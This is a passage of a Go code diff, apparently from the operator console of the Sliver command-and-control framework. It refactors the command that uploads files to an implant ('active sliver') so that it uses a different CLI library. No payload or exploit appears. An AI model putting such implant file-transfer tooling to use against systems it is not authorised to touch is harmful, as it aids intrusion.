 	defer f.Close()
 	f.Write(data)
@@ -663,16 +632,9 @@ func activeSliverDownload(filePath string) ([]byte, error) {
 	return download.Data, nil
 }
 
-func uploadCmd(term *readline.Instance, args []string) {
-	uploadFlags := flag.NewFlagSet("upload", flag.ContinueOnError)
-	uploadFlags.Usage = func() { helpCmd(term, []string{"upload"}) }
-	err := uploadFlags.Parse(args)
-	if err == flag.ErrHelp {
-		return
-	}
-
+func uploadCmd(ctx *grumble.Context) {
 	if activeSliver == nil {
-		fmt.Fprintln(term, "\n"+Warn+"Please select an active sliver via `use`\n")
+		fmt.Println("\n" + Warn + "Please select an active sliver via `use`\n")
 		return
 	}
 
